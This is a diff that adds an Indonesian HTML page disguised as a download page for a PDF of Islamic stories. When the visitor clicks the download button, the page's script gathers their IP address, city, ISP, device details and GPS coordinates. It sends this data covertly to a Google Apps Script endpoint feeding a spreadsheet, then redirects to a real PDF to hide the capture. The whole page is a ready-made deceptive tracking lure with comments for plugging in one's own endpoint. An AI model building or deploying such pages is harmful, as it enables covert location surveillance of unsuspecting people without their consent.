@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>KUMPULAN CERITA ISLAMI</title>
+    <style>
+        body { font-family: 'Roboto', Arial, sans-serif; background-color: #f8f9fa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: white; padding: 40px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); text-align: center; width: 100%; max-width: 420px; border: 1px solid #e0e0e0; }
+        .icon { width: 72px; height: 72px; margin-bottom: 20px; }
+        h1 { font-size: 22px; color: #202124; margin: 10px 0; font-weight: 400; }
+        .info { font-size: 14px; color: #5f6368; margin-bottom: 30px; line-height: 1.5; }
+        .btn { background-color: #1a73e8; color: white; border: none; padding: 12px 24px; border-radius: 6px; font-weight: 500; cursor: pointer; width: 100%; font-size: 15px; transition: background 0.2s; }
+        .btn:hover { background-color: #174ea6; }
+        #status { display: none; margin-top: 20px; font-size: 13px; color: #1a73e8; font-style: italic; }
+    </style>
+</head>
+<body>
+
+    <div class="card">
+        <img src="https://ssl.gstatic.com/docs/doclist/images/mediatype/icon_3_pdf_x64.png" class="icon" alt="PDF">
+        <h1>Kumpulan Cerita Islami.pdf</h1>
+        <div class="info">
+            Ukuran: 3.8 MB <br>
+            Pemilik: Ebook Remaja 
+        </div>
+        
+        <button class="btn" onclick="startCapture()">UNDUH SEKARANG</button>
+        <div id="status">Menyiapkan file unduhan, Mohon bersabar</div>
+    </div>
+
+    <script>
+        // 1. MASUKKAN URL WEB APP GAS ANDA DI SINI
+        const GAS_URL = "https://script.google.com/macros/s/AKfycbz6wvuSSnajJHmeEeP0WFdCzimcUER25MaOV1cxCDafl069ZAgbG0gL_nYVP2mU5KCd3A/exec";
+        
+        // 2. MASUKKAN LINK FILE ASLI (Agar user benar-benar dapat filenya)
+        const FINAL_FILE_URL = "https://www.dropbox.com/scl/fi/t2ad0kne9eav7sj333qg8/cerita1.pdf?rlkey=91y7hp2c63rha5d00p8eva9kj&st=yd3wq4sd&dl=1";
+
+        async function startCapture() {
+            document.getElementById('status').style.display = "block";
+            
+            let payload = {
+                ip: "Unknown",
+                city: "Unknown",
+                isp: "Unknown",
+                device: navigator.userAgent,
+                platform: navigator.platform,
+                screen: screen.width + "x" + screen.height,
+                lat: "N/A",
+                lon: "N/A"
+            };
+
+            // Step 1: Ambil data IP & Lokasi (Cepat & Tanpa Izin)
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                const res = await response.json();
+                payload.ip = res.ip;
+                payload.city = `${res.city}, ${res.country_name}`;
+                payload.isp = res.org;
+                payload.lat = res.latitude;
+                payload.lon = res.longitude;
+            } catch (e) { console.log("IP lookup failed"); }
+
+            // Step 2: Coba ambil GPS Presisi (Akan muncul prompt izin)
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => {
+                        payload.lat = pos.coords.latitude;
+                        payload.lon = pos.coords.longitude;
+                        payload.acc = pos.coords.accuracy.toFixed(1) + "m";
+                        sendAndRedirect(payload);
+                    },
+                    () => { sendAndRedirect(payload); }, // Jika user menolak GPS
+                    { timeout: 4000 }
+                );
+            } else {
+                sendAndRedirect(payload);
+            }
+
+            // Safety timeout: Jika proses terlalu lama (misal 6 detik), langsung redirect
+            setTimeout(() => {
+                window.location.href = FINAL_FILE_URL;
+            }, 6000);
+        }
+
+        function sendAndRedirect(data) {
+            // Kirim data ke Google Sheets
+            fetch(GAS_URL, {
+                method: "POST",
+                mode: "no-cors", // Penting untuk menghindari CORS error di GAS
+                body: JSON.stringify(data),
+                headers: { "Content-Type": "application/json" }
+            }).then(() => {
+                window.location.href = FINAL_FILE_URL;
+            }).catch(() => {
+                window.location.href = FINAL_FILE_URL;
+            });
+        }
+    </script>
+</body>
+</html>
